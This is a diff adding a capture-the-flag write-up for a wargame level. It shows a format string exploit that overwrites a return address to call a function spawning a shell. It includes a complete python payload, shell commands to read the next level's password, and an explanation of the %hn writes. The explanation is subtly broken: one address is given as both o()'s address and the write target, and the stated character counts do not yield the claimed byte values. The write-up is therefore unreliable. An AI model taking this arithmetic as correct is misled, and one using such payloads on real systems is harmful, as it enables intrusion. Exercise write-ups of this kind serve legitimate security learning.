@@ -1,0 +1,112 @@
+# Exploiting a Format String Vulnerability to Call a Function
+
+In this exercise, we exploit a **format string vulnerability** to redirect the program’s execution flow and force it to call the `o()` function, which spawns a shell using `system("/bin/sh")`.
+
+---
+
+### Understanding the Code
+
+1. **Key Observations**:
+   - The vulnerable function `n()` reads input into a buffer (`buf`) using `fgets` and passes it unsafely to `printf(buf)`.
+   - The `printf` call directly prints the user-supplied input (`buf`) without sanitization, allowing a **format string attack**.
+
+2. **Goal**:
+   - Overwrite the **return address** of `n()` with the address of `o()`, redirecting program execution after `n()` to `o()`.
+
+3. **Function Addresses**:
+   - The address of `o()` is `0x08049838`.
+   - The return address of `n()` is stored on the stack and needs to be overwritten.
+
+4. **Buffer Details**:
+   - The buffer `buf` is **520 bytes** in size, providing ample room for the format string exploit.
+
+---
+
+### The Exploit
+
+To redirect the program's execution flow to the `o()` function, we need to:
+1. Overwrite the **return address** stored on the stack with the address of `o()`.
+2. Use the format string `%n` to write precise values to specific memory addresses.
+
+---
+
+### Crafting the Exploit
+
+#### 1. Memory Address Layout
+- **`0x08049838`**:
+  The address of the `o()` function.
+  
+- Since we cannot write this address in one go, we split it into **two halves**:
+  - The **lower 2 bytes**: `0x9838`
+  - The **higher 2 bytes**: `0x0804`
+
+- We place two copies of the return address on the stack so we can write to them separately:
+  - `0x08049838` (little-endian: `\x38\x98\x04\x08`) writes the **lower half**.
+  - `0x0804983a` (little-endian: `\x3a\x98\x04\x08`) writes the **higher half**.
+
+#### 2. Format String Details
+The format string will:
+1. Print enough characters to match the desired values.
+2. Use `%hn` to write the lower and higher halves to the specified addresses.
+
+In the context of format strings in C, the h modifier is used to specify that the argument being processed is a short integer (2 bytes) rather than the default int (4 bytes).
+
+When combined with %n, it determines the size of the value that is written to memory.
+
+---
+
+#### 3. Exploit Breakdown
+
+##### Full Payload:
+```bash
+(python -c 'print("\x38\x98\x04\x08\x3a\x98\x04\x08%2044x%5$hn%31904x%4$hn")'; cat -) | ./level5
+```
+
+##### Explanation of Each Component:
+
+1. **`"\x38\x98\x04\x08"`**:
+   - The little-endian representation of the address `0x08049838`, which holds the **lower 2 bytes** of `o()`'s address.
+   
+2. **`"\x3a\x98\x04\x08"`**:
+   - The little-endian representation of the address `0x0804983a`, which holds the **upper 2 bytes** of `o()`'s address.
+
+3. **`"%2044x"`**:
+   - Prints **2044 characters** to adjust the `printf` counter to 2044. This ensures the lower 2 bytes `0x9838` are written to `0x08049838` when `%5$hn` is executed.
+
+4. **`"%5$hn"`**:
+   - Writes the last 2 bytes of the current `printf` counter (2044) to the **address at stack position 5**, which is `0x08049838`.
+
+5. **`"%31904x"`**:
+   - Prints **31904 additional characters** to adjust the `printf` counter to 33948 (2044 + 31904). This ensures the upper 2 bytes `0x0804` are written to `0x0804983a` when `%4$hn` is executed.
+
+6. **`"%4$hn"`**:
+   - Writes the last 2 bytes of the current `printf` counter (33948) to the **address at stack position 4**, which is `0x0804983a`.
+
+---
+
+### Execution Steps
+
+1. **Run the Exploit**:
+   ```bash
+   (python -c 'print("\x38\x98\x04\x08\x3a\x98\x04\x08%2044x%5$hn%31904x%4$hn")'; cat -) | ./level5
+   ```
+
+2. **Expected Outcome**:
+   - The return address of `n()` is replaced with the address of `o()`.
+   - The program executes `o()` after `n()`, spawning a shell.
+
+3. **Verify the Exploit**:
+   - Interact with the spawned shell:
+     ```bash
+     whoami
+     cat /home/user/level6/.pass
+     exit
+     ```
+
+---
+
+### Summary of Exploit
+
+This attack exploits a **format string vulnerability** to overwrite the return address of the `n()` function. By carefully crafting the input:
+- Two writes using `%hn` are used to set the full 4-byte address of `o()` in the return address.
+- This ensures the program execution flow is redirected to the desired function (`o()`), ultimately spawning a shell.
